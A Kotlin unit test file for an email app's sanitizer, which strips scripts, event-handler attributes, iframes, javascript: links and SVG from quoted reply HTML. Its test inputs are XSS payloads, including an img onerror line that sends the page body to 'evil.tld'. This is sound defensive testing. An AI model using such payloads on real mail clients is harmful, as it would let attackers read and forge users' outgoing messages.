package com.urlxl.mail.mail

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * The compose editor is a JavaScript-enabled WebView with a bound `@JavascriptInterface`, and
 * `setHtml` assigns straight to `innerHTML`. A `<script>` inserted that way does not run, but event
 * handler content attributes on inserted elements do — so quoting a sender's message into a reply
 * handed them read and write access to the message the user was about to send.
 *
 * These are the constructs that must not survive the quote.
 */
class QuotedHtmlSanitizerTest {

    private fun sanitized(html: String) = QuotedHtmlSanitizer.sanitize(html)

    @Test
    fun stripsOnErrorHandlerButKeepsTheElement() {
        val out = sanitized("""<img src="x" onerror="fetch('https://evil.tld/'+document.body.innerHTML)">""")

        assertFalse(out.contains("onerror", ignoreCase = true))
        assertFalse(out.contains("evil.tld"))
    }

    @Test
    fun stripsEveryEventHandlerAttribute() {
        val out = sanitized(
            """<div onload="a()" onclick="b()" onmouseover="c()" onfocus="d()">text</div>""",
        )

        listOf("onload", "onclick", "onmouseover", "onfocus").forEach {
            assertFalse("$it survived: $out", out.contains(it, ignoreCase = true))
        }
        assertTrue(out.contains("text"))
    }

    @Test
    fun dropsScriptContentEntirely() {
        val out = sanitized("""<p>hi</p><script>window.editor.exportHtml('forged')</script>""")

        assertFalse(out.contains("script", ignoreCase = true))
        assertFalse(out.contains("exportHtml"))
        assertTrue(out.contains("hi"))
    }

    @Test
    fun dropsIframeSrcdocPayload() {
        val out = sanitized("""<iframe srcdoc="&lt;script&gt;parent.window.editor&lt;/script&gt;"></iframe>""")

        assertFalse(out.contains("iframe", ignoreCase = true))
        assertFalse(out.contains("srcdoc", ignoreCase = true))
    }

    @Test
    fun dropsJavascriptUrlOnALink() {
        val out = sanitized("""<a href="javascript:window.editor.exportHtml('forged')">click</a>""")

        assertFalse(out.contains("javascript:", ignoreCase = true))
        assertTrue(out.contains("click"))
    }

    @Test
    fun dropsSvgAndObjectAndEmbed() {
        val out = sanitized(
            """<svg><animate onbegin="a()"/></svg><object data="x"></object><embed src="y">""",
        )

        listOf("svg", "animate", "object", "embed", "onbegin").forEach {
            assertFalse("$it survived: $out", out.contains(it, ignoreCase = true))
        }
    }

    @Test
    fun keepsOrdinaryFormattingSoRepliesStillLookLikeReplies() {
        val out = sanitized(
            """<p>Hello <b>Bob</b>, see <a href="https://example.com">this</a>.</p>""" +
                """<ul><li>one</li></ul><blockquote>quoted</blockquote>""",
        )

        assertTrue(out.contains("<b>Bob</b>"))
        assertTrue(out.contains("""href="https://example.com""""))
        assertTrue(out.contains("<li>"))
        assertTrue(out.contains("<blockquote>"))
    }

    @Test
    fun keepsInlineImagesButNotTheirHandlers() {
        val out = sanitized("""<img src="https://example.com/logo.png" alt="logo" onerror="x()">""")

        assertTrue(out.contains("logo.png"))
        assertFalse(out.contains("onerror", ignoreCase = true))
    }

    @Test
    fun emptyInputStaysEmpty() {
        assertEquals("", sanitized(""))
    }
}
